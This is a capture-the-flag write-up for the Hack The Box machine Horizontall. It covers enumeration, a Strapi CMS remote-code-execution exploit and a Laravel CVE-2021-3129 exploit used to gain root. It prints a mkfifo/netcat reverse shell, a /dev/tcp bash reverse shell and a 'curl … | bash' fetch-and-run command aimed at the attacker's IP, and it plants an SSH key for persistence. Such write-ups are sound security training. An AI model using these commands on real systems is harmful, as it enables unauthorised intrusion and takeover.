## Horizontall

Difficulty: Easy

### User Flag

```
rustscan -a horizontall.htb --ulimit 5000 -- -A -sV -sC
```

![rustscan](https://user-images.githubusercontent.com/58514930/221204033-bf1aefe3-6129-46ee-a6cc-952b061b2c70.png)

<br>

Doing some subdomain enumeration, we discover "api-prod".

```
wfuzz -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u http://horizontall.htb/ --hc 301 -H "Host:FUZZ.horizontall.htb"
```

Another way could be searching for the domain name in javascript files.

```
cat app.c68eb462.js | grep "horizontall"
```

![javascriptSubdomain](https://user-images.githubusercontent.com/58514930/221205260-8f584015-045a-4057-8211-4389f24a4de2.png)

<br>

```
gobuster dir -u http://api-prod.horizontall.htb -w /usr/share/wordlists/dirb/big.txt -t 50
```

![gobuster](https://user-images.githubusercontent.com/58514930/221206512-a335941e-d904-4f54-a273-d3c72a8ac320.png)

<br>

Accessing /admin we find a Strapi CMS.

We can discover the version by accessing /admin/init.

![strapiCMS](https://user-images.githubusercontent.com/58514930/221207132-18b90eab-4a96-436c-9fc5-7036c89d65c6.png)

![strapVersion](https://user-images.githubusercontent.com/58514930/221207153-a1fa45cf-d757-47ee-a49a-fabac5fc2672.png)

<br>

Searching for vulnerabilities, we find [this exploit](https://www.exploit-db.com/exploits/50239) to RCE.  
Just use it and send a mkfifo reverse shell.

```
python3 exploit.py http://api-prod.horizontal.htb
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.2 1234 >/tmp/f
```

![exploitStrapi](https://user-images.githubusercontent.com/58514930/221207555-ec6da3c2-5c23-4d37-ac2d-def9368472eb.png)

### Root Flag

Doing some enumeration, we discover port 8000 is listening something.

![listeningPorts](https://user-images.githubusercontent.com/58514930/221207941-33993dff-3450-4bc2-aa0b-67572e404b3a.png)

<br>

We need to generate an SSH key to forward the port as we don't have the strapi password.

```
# On our machine
ssh-keygen -t rsa
```

Copy the content of .pub file inside ~/.ssh/authorized_keys in the victim machine.  

![generateKey](https://user-images.githubusercontent.com/58514930/221208575-56ae4da1-e024-414a-8831-e6d98fa0c127.png)

<br>

Now we forward the port 8000 from victim to 8001 on our localhost.

```
ssh -i strapi -L 8001:127.0.0.1:8000 strapi@10.10.11.105
```

Accessing it, there is a Laravel v8.

![laravel](https://user-images.githubusercontent.com/58514930/221208796-3825e6e1-da83-4773-9797-4eac1a1d0ad1.png)

<br>

Searching for exploits, we find [this one](https://github.com/nth347/CVE-2021-3129_exploit).

Create a "shell" file with "bash -i >& /dev/tcp/10.10.14.2/3333 0>&1;" since a direct reverse shell doesn't seems to work here.

```
./exploit.py http://localhost:8001 Monolog/RCE1 "curl 10.10.14.2:8000/shell | bash"
```

![gettingRoot](https://user-images.githubusercontent.com/58514930/221209721-88ddbbda-4691-40dc-bb9a-d2263aac2038.png)

![rootUser](https://user-images.githubusercontent.com/58514930/221209745-b43b6fe2-5d7b-4279-bb5b-d9b36431f574.png)
